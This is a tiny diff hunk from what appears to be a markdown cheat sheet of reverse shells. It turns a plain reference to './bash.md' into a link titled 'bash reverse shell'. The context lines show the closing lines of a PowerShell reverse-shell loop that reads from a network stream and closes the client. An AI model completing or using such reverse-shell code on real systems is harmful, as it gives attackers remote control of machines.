@@ -29,7 +29,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-Refer ./bash.md for more
+Refer to [bash reverse shell](./bash.md) for more.
 
 ## Resources
 
